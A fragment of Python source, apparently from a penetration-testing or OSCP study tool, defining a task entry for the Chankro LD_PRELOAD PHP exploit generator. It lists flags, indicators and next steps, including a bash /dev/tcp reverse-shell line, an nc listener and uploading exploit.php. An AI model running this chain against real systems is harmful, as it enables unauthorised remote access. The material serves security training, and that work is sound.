                            'chankro.py': 'LD_PRELOAD exploit generator',
                            '--arch 64': 'Target architecture (32 or 64 bit)',
                            '--input': 'Shell script to execute',
                            '--path': 'Writable path on target for temp files',
                            '--output': 'Generated PHP exploit file'
                        },
                        'success_indicators': [
                            'Exploit generated successfully',
                            'Upload and access exploit.php',
                            'mail() and putenv() not disabled',
                            'Reverse shell received'
                        ],
                        'failure_indicators': [
                            'mail/putenv disabled',
                            'Cannot write to specified path',
                            'Architecture mismatch',
                            'LD_PRELOAD blocked'
                        ],
                        'next_steps': [
                            'Create shell.sh: bash -i >& /dev/tcp/LHOST/LPORT 0>&1',
                            'Generate exploit with Chankro',
                            'Upload exploit.php',
                            'Start listener: nc -lvnp LPORT',
                            'Access exploit.php via browser'
                        ],
                        'alternatives': [
                            'Manual .so compilation',
                            'Use mb_send_mail instead of mail',
                            'Try imagick bypass',
                            'FastCGI exploit'
                        ],
                        'tags': ['OSCP:HIGH', 'TOOL', 'ADVANCED'],
                        'notes': 'INSTALL: git clone https://github.com/TarlogicSecurity/Chankro /opt/Chankro',
                        'estimated_time': '10-15 minutes'
                    }
                }
            ]
        })

        return tasks
